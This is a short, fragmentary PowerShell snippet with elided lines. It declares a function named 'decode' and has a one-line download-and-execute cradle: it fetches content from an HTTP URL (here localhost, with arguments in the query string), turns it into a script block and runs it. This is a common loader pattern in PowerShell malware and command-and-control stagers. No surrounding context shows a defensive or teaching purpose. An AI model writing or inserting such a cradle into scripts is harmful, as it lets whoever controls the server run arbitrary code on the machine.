...
function decode([String]$to_unenc) {
...
. ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "http://localhost/?args=$args").Content))))